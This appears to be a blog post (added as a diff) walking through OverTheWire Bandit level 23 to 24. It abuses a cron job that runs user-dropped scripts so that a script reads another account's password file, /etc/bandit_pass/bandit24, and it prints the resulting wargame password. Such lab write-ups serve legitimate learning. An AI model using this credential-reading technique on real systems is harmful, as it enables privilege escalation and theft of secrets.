@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Overthewire Bandit Level 23 To 24 | The world of Jason Benedetti</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Overthewire Bandit Level 23 To 24" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Level goal ```bash A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed." />
+<meta property="og:description" content="Level goal ```bash A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed." />
+<link rel="canonical" href="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-23-to-24.html" />
+<meta property="og:url" content="http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-23-to-24.html" />
+<meta property="og:site_name" content="The world of Jason Benedetti" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-09T10:20:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Overthewire Bandit Level 23 To 24" />
+<script type="application/ld+json">
+{"headline":"Overthewire Bandit Level 23 To 24","dateModified":"2021-04-09T10:20:00+01:00","datePublished":"2021-04-09T10:20:00+01:00","url":"http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-23-to-24.html","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-23-to-24.html"},"description":"Level goal ```bash A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="The world of Jason Benedetti" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">The world of Jason Benedetti</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Overthewire Bandit Level 23 To 24</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-04-09T10:20:00+01:00" itemprop="datePublished">Apr 9, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="level-goal">Level goal</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A program is running automatically at regular intervals from <span class="k">**</span>cron<span class="k">**</span>, the time-based job scheduler. Look <span class="k">in</span> <span class="k">**</span>/etc/cron.d/<span class="k">**</span> <span class="k">for </span>the configuration and see what <span class="nb">command </span>is being executed.
+
+<span class="k">**</span>NOTE:<span class="k">**</span> This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+<span class="k">**</span>NOTE 2:<span class="k">**</span> Keep <span class="k">in </span>mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+<span class="c">## Commands you may need to solve this level</span>
+
+cron, crontab, crontab<span class="o">(</span>5<span class="o">)</span> <span class="o">(</span>use “man 5 crontab” to access this<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="lets-look-in-that-folder-again-and-look-at-what-the-bandit24-job-does">Lets look in that folder again and look at what the bandit24 job does..</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit23@bandit:/tmp/zd23<span class="nv">$ </span><span class="nb">cd</span> /etc/cron.d/
+bandit23@bandit:/etc/cron.d<span class="nv">$ </span><span class="nb">ls
+</span>cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit23@bandit:/etc/cron.d<span class="nv">$ </span><span class="nb">cat </span>cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
+<span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null
+</code></pre></div></div>
+
+<h2 id="lets-open-that-script-and-take-a-look">Lets open that script and take a look</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit23@bandit:/etc/cron.d<span class="nv">$ </span><span class="nb">cat</span> /usr/bin/cronjob_bandit24.sh
+<span class="c">#!/bin/bash</span>
+
+<span class="nv">myname</span><span class="o">=</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span>
+
+<span class="nb">cd</span> /var/spool/<span class="nv">$myname</span>
+<span class="nb">echo</span> <span class="s2">"Executing and deleting all scripts in /var/spool/</span><span class="nv">$myname</span><span class="s2">:"</span>
+<span class="k">for </span>i <span class="k">in</span> <span class="k">*</span> .<span class="k">*</span><span class="p">;</span>
+<span class="k">do
+    if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">"."</span> <span class="nt">-a</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">".."</span> <span class="o">]</span><span class="p">;</span>
+    <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Handling </span><span class="nv">$i</span><span class="s2">"</span>
+        <span class="nv">owner</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">stat</span> <span class="nt">--format</span> <span class="s2">"%U"</span> ./<span class="nv">$i</span><span class="si">)</span><span class="s2">"</span>
+        <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="k">${</span><span class="nv">owner</span><span class="k">}</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"bandit23"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+            </span><span class="nb">timeout</span> <span class="nt">-s</span> 9 60 ./<span class="nv">$i</span>
+        <span class="k">fi
+        </span><span class="nb">rm</span> <span class="nt">-f</span> ./<span class="nv">$i</span>
+    <span class="k">fi
+done</span>
+</code></pre></div></div>
+
+<h2 id="so-it-looks-like-we-need-to-create-a-script-put-it-in-the-varspoolbandit24-folder-guessing-because-theres-nothing-there-we-need-to-get-the-bandit24-password-from-the-etcbandit_pass-directory-etcbandit_passbandit24">So, it looks like we need to create a script, put it in the /var/spool/bandit24 folder. Guessing because there’s nothing there we need to get the bandit24 password from the /etc/bandit_pass directory (/etc/bandit_pass/bandit24)</h2>
+
+<h2 id="lets-create-a-tmp-directory-and-a-script">Lets create a tmp directory and a script</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit23@bandit:~<span class="nv">$ </span><span class="nb">mkdir</span> /tmp/zd23
+bandit23@bandit:~<span class="nv">$ </span><span class="nb">cd</span> /tmp/zd23
+bandit23@bandit:/tmp/zd23<span class="nv">$ </span>vi script.sh
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+<span class="nb">cat</span> /etc/bandit_pass/bandit24 <span class="o">&gt;&gt;</span> /tmp/zd23/beep
+</code></pre></div></div>
+
+<h2 id="lets-make-it-executable">Lets make it executable</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit23@bandit:/tmp/zd23<span class="nv">$ </span><span class="nb">chmod </span>777 script.sh
+bandit23@bandit:/tmp/zd23<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ls</span>
+total 4
+4 <span class="nt">-rwxrwxrwx</span> 1 bandit23 root 52 Apr  9 12:21 script.sh
+</code></pre></div></div>
+
+<h2 id="lets-copy-it-to-the-spool-directory-and-see-what-happens">Lets copy it to the spool directory and see what happens</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bandit23@bandit:/tmp/zd23<span class="nv">$ </span><span class="nb">cp </span>script.sh /var/spool/bandit24
+<span class="c"># An eternity laster..</span>
+bandit23@bandit:/tmp/zd23<span class="nv">$ </span><span class="nb">ls
+</span>beep  script.sh
+bandit23@bandit:/tmp/zd23<span class="nv">$ </span><span class="nb">cat </span>beep
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+</code></pre></div></div>
+
+<h2 id="okay---so-nothing-actually-happened-for-ages-had-to-do-some-googling-had-to-actually-give-the-tmpzd23-folder-permissions-to-be-written-to-it-then-worked-777-all-the-things">Okay - So nothing actually happened for ages, had to do some googling. Had to actually give the /tmp/zd23 folder permissions to be written to.. It then worked (777 all the things)</h2>
+
+<p>VICTORY.</p>
+
+<h2 id="the-password-for-level-24">The password for level 24:</h2>
+
+<p>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>
+
+<p>On the next episode of Bandit…</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh bandit24@localhost
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/overthewire/bandit/2021/04/09/OverTheWire-Bandit-Level-23-to-24.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">The world of Jason Benedetti</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">The world of Jason Benedetti</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/Zerodriven"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">Zerodriven</span></a></li><li><a href="https://www.twitter.com/JasonBenedetti"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">JasonBenedetti</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Tech stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
